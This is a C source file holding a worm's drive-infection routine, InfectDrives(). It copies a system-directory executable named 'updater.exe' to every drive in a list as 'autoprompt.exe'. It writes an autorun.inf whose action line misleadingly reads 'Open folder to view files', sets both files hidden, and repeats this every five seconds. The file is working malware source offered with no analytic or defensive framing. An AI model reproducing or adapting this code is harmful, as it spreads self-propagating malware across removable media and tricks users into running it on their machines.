#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void InfectDrives(void)
{
    volatile struct _LocalCtx {
        char IFile[256];
        char NewFile[256];
        char Autorun[256];
        char InfFile[256];
        int i;
        FILE *runfile;
    } ctx;

    // Initializations moved outside struct definition
    // Variables are not initialized at declaration; they will be assigned later.
    // ctx.i is not initialized here because it's set in the for loop.

    GetSystemDirectoryA(ctx.IFile, sizeof(ctx.IFile));
    strcat(ctx.IFile, "\\updater.exe");

    while (1) {
        for (ctx.i = 0; Inf_Drives[ctx.i]; ctx.i++) {
            memset(ctx.NewFile, 0, sizeof(ctx.NewFile));
            memset(ctx.Autorun, 0, sizeof(ctx.Autorun));
            memset(ctx.InfFile, 0, sizeof(ctx.InfFile));

            strcpy(ctx.NewFile, Inf_Drives[ctx.i]);
            strcpy(ctx.Autorun, Inf_Drives[ctx.i]);

            strcat(ctx.NewFile, "\\autoprompt.exe");
            strcat(ctx.Autorun, "\\autorun.inf");

            if (CopyFileA(ctx.IFile, ctx.NewFile, FALSE)) {
                ctx.runfile = fopen(ctx.Autorun, "wb");
                if (ctx.runfile) {
                    sprintf(ctx.InfFile,
                            "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
                    fputs(ctx.InfFile, ctx.runfile);
                    fclose(ctx.runfile);
                }
                SetFileAttributesA(ctx.NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                SetFileAttributesA(ctx.Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
            }
        }
        Sleep(5000);
    }
}
#pragma optimize("", on)
